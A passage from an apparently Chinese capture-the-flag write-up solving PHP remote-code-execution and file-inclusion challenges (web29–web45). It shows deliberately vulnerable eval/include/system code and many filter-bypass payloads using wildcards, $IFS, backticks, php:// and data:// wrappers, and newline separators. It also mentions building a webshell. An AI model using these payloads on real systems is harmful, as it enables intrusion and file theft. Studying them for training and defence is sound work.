<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=system(&quot;cp fl*g.php fl0g.txt &quot;);</span><br></pre></td></tr></table></figure>
<p>然后再访问fl0g.txt就可以得到全部了</p>
<h4 id="方法五">方法五</h4>
<p>tac与system结合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=system(&quot;tac%20fla*&quot;);</span><br></pre></td></tr></table></figure>
<p>tac和echo命令相结合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=echo%20`tac%20fla*`;</span><br></pre></td></tr></table></figure>
<h4 id="方法六">方法六</h4>
<p>使用参数引用+system</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=eval($_GET[a]);&amp;a=system(&quot;tac flag.php&quot;);</span><br></pre></td></tr></table></figure>
<p>使用参数引用+伪协议读取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<p>得到的需要base64解码</p>
<h4 id="方法七">方法七</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=highlight_file(next(array_reverse(scandir(&quot;.&quot;))));</span><br></pre></td></tr></table></figure>
<ol>
<li><strong>解释 <code>scandir(&quot;.&quot;)</code>：</strong>
<ul>
<li><code>scandir()</code> 函数用于获取指定目录中的文件和目录列表。</li>
<li><code>.</code> 表示当前目录。</li>
</ul>
</li>
<li><strong>解释 <code>array_reverse()</code>：</strong>
<ul>
<li><code>array_reverse()</code> 函数用于反转数组中的元素的顺序。</li>
</ul>
</li>
<li><strong>解释 <code>next()</code>：</strong>
<ul>
<li><code>next()</code> 函数用于将数组指针移动到数组中的下一个元素，并返回该元素的值。</li>
</ul>
</li>
<li><strong>解释 <code>highlight_file()</code>：</strong>
<ul>
<li><code>highlight_file()</code> 函数用于在浏览器中以语法高亮的形式显示 PHP 文件的内容。</li>
</ul>
</li>
</ol>
<p>有参考意义</p>
<h2 id="web30">web30</h2>
<h3 id="源码-2">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-2">payload</h3>
<p>参考上题，其实就是多过滤了一个system和php</p>
<p>因此上题的部分payload也能打通</p>
<p>以下给出几个主要思路去思考</p>
<h4 id="方法一-2">方法一</h4>
<p>使用echo去代替system</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=echo%20`tac%20fla*`;</span><br></pre></td></tr></table></figure>
<h4 id="方法二">方法二</h4>
<p>使用其他命令执行函数去代替system</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&quot;tac%20fla*&quot;);</span><br></pre></td></tr></table></figure>
<h4 id="方法三-2">方法三</h4>
<p>使用参数引用+system</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=eval($_GET[a]);&amp;a=system(&quot;tac flag.php&quot;);</span><br></pre></td></tr></table></figure>
<p>使用参数引用+伪协议读取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<h4 id="方法四-2">方法四</h4>
<p>还有一种绕过方法</p>
<p>利用’ '去分割字符绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=echo `tac fl&#x27;&#x27;ag.p&#x27;&#x27;hp`;</span><br></pre></td></tr></table></figure>
<h4 id="方法五-2">方法五</h4>
<p>使用???去进行单个字符的匹配</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=echo `tac%20fla?????`;</span><br></pre></td></tr></table></figure>
<h4 id="方法六-2">方法六</h4>
<p>构造一句话木马，蚁剑连接</p>
<h2 id="web31">web31</h2>
<h3 id="源码-3">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-3">payload</h3>
<p>相比上一题。这边多过滤了cat，sort，shell，\. ，空格，\</p>
<h4 id="方法一-3">方法一</h4>
<p>参数引用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=eval($_GET[&quot;b&quot;]);&amp;b=system(&quot;tac%20flag.php&quot;);	</span><br></pre></td></tr></table></figure>
<h4 id="方法二-2">方法二</h4>
<p>其他执行函数绕过，以及*通配符，最不同的是空格方面的绕过方法</p>
<p>这边使用的命令拼接符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&quot;tac%09fla?&quot;);</span><br></pre></td></tr></table></figure>
<p>FS绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&quot;tac\$IFS\$9fla*&quot;);</span><br></pre></td></tr></table></figure>
<h4 id="方法三-3">方法三</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
<ol>
<li><code>scandir(pos(localeconv()))</code>：获取当前目录下的文件列表。pos在这里的作用是为了代替出小数点。</li>
<li><code>array_reverse</code>：将文件列表反转，改变它们的顺序。</li>
<li><code>next</code>：获取反转后列表的下一个元素。</li>
<li><code>show_source</code>：显示指定文件的源代码。</li>
</ol>
<h2 id="web32">web32</h2>
<h3 id="源码-4">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="payload-4">payload</h4>
<p>增加了很多过滤，把echo相关也过滤掉了，以及(和；</p>
<h4 id="方法一-4">方法一</h4>
<p>参数引用+伪协议读取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<h2 id="web33">web33</h2>
<h3 id="源码-5">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-5">payload</h3>
<p>虽然增添了“的过滤，但是仍然可以使用文件包含的方法绕过</p>
<h4 id="方法一-5">方法一</h4>
<p>参数引用+伪协议读取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<h4 id="方法二-3">方法二</h4>
<p>伪协议嵌入文本数据+参数引用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="web34">web34</h2>
<h3 id="源码-6">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-6">payload</h3>
<p>过滤了：，但是仍然可以使用文件包含的方式去绕过</p>
<h4 id="方法一-6">方法一</h4>
<p>参数引用+伪协议读取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<h4 id="方法二-4">方法二</h4>
<p>伪协议嵌入文本数据+参数引用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="web35">web35</h2>
<h3 id="源码-7">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-7">payload</h3>
<p>同上</p>
<h4 id="方法一-7">方法一</h4>
<p>参数引用+伪协议读取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<h4 id="方法二-5">方法二</h4>
<p>伪协议嵌入文本数据+参数引用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="web36">web36</h2>
<h3 id="源码-8">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="payload-8">payload</h3>
<p>过滤了数字</p>
<h4 id="方法一-8">方法一</h4>
<p>参数引用+伪协议读取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<h4 id="方法二-6">方法二</h4>
<p>伪协议嵌入文本数据+参数引用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(&quot;tac flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="web37">web37</h2>
<h3 id="源码-9">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-9">payload</h3>
<p>这边使用的函数与上一部分略有区别，修改了部分，使用的是include函数的利用方法</p>
<p>仅过滤了flag字样，还是简单的</p>
<h4 id="方法一-9">方法一</h4>
<p>使用了伪协议+base编码绕过读取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</span><br></pre></td></tr></table></figure>
<h4 id="方法二-7">方法二</h4>
<p>重点还是对伪协议的利用，*的绕过方法参考上面，当然，也可以使用?绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(&quot;tac fla*.php&quot;)?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="方法三-4">方法三</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=php://input</span><br></pre></td></tr></table></figure>
<p>Post</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&quot;tac flag.php&quot;)?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="web38">web38</h2>
<h3 id="源码-10">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-10">payload</h3>
<p>增加了php和file两个协议的过滤</p>
<h4 id="方法一-10">方法一</h4>
<p>使用了伪协议+base编码绕过读取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</span><br></pre></td></tr></table></figure>
<h4 id="方法二-8">方法二</h4>
<p>重点还是对伪协议的利用，*的绕过方法参考上面，当然，也可以使用?绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(&quot;tac fla*.php&quot;)?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="web39">web39</h2>
<h3 id="源码-11">源码</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        include($c.&quot;.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-11">payload</h3>
<p>自动拼接.php</p>
<h4 id="方法一-11">方法一</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(&quot;tac%20fla*.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="web40">web40</h2>
<h3 id="源码-12">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-12">payload</h3>
<h4 id="方法一-12">方法一</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
<p>参考web31方法三</p>
<h4 id="方法二-9">方法二</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=eval(next(reset(get_defined_vars())));&amp;1=;system(&quot;tac%20flag.php&quot;); </span><br></pre></td></tr></table></figure>
<ol>
<li>
<p><code>?c=eval(next(reset(get_defined_vars())));</code>: 这部分是通过URL参数传递的命令。解析过程如下：</p>
<ul>
<li><code>get_defined_vars()</code>: 获取当前作用域中所有已定义的变量的列表。</li>
<li><code>reset()</code>: 将数组内部的指针指向第一个元素，并返回该元素的值。</li>
<li><code>next()</code>: 将数组内部的指针移动到下一个元素，并返回该元素的值。</li>
<li><code>eval()</code>: 执行传入的字符串作为PHP代码。</li>
</ul>
<p>综合起来，这一部分的目的是获取当前作用域中的一个已定义变量，并将其值作为字符串传递给 <code>eval()</code> 函数，实际上是执行这个字符串作为PHP代码。</p>
</li>
<li>
<p><code>&amp;1=;system(&quot;tac%20flag.php&quot;);</code>: 这是第二个URL参数，其中 <code>1</code> 是参数名，而 <code>;</code> 表示将其值设为空。接着是一个 <code>system()</code> 函数调用，尝试执行系统命令。</p>
<ul>
<li><code>system(&quot;tac%20flag.php&quot;);</code>: 这部分试图执行 <code>tac</code> 命令，<code>tac</code> 是Linux系统中的一个命令，用于反向读取文件内容。<code>%20</code> 是URL编码中的空格。</li>
</ul>
</li>
</ol>
<h2 id="web41">web41</h2>
<h3 id="源码-13">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="payload-13">payload</h3>
<p>本题过滤了字母和数字，那很明显就是考察的无字母数字rce了</p>
<p>详细的需要单独开一篇去说明相关原理和衍生方法</p>
<h2 id="web42">web42</h2>
<h3 id="源码-14">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-14">payload</h3>
<p>本题的关键在于使用了一个重定向，导致了无回显</p>
<p>使用分隔来进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;     分号</span><br><span class="line">|     只执行后面那条命令</span><br><span class="line">||    只执行前面那条命令</span><br><span class="line">&amp;     两条命令都会执行</span><br><span class="line">&amp;&amp;    两条命令都会执行</span><br><span class="line">%0a   换行符的url 编码</span><br></pre></td></tr></table></figure>
<h4 id="方法一-13">方法一</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac flag.php;ls</span><br></pre></td></tr></table></figure>
<h4 id="方法二-10">方法二</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac flag.php||ls</span><br></pre></td></tr></table></figure>
<h4 id="方法三-5">方法三</h4>
<p>使用&amp;和&amp;&amp;需要对其进行url编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac flag.php%26ls</span><br></pre></td></tr></table></figure>
<h4 id="方法四-3">方法四</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac flag.php%0a</span><br></pre></td></tr></table></figure>
<h2 id="web43">web43</h2>
<h3 id="源码-15">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-15">payload</h3>
<p>这里添加对cat命令和;的过滤，参考前部分的bypass手段即可，因此这边只给出一种参考payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac flag.php%0a</span><br></pre></td></tr></table></figure>
<h2 id="web44">web44</h2>
<h3 id="源码-16">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-16">payload</h3>
<p>增加了对flag的过滤，直接参考上面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac fla*.php%0a</span><br></pre></td></tr></table></figure>
<h2 id="web45">web45</h2>
<h3 id="源码-17">源码</h3>
